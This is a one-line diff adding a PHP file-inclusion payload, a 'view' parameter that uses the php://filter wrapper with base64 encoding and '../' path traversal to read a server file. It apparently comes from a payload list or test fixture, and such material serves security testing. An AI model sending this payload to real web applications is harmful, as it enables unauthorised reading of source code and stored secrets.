@@ -1,0 +1,1 @@
+?view=php://filter/convert.base64-encode/resource=path/to/../../file
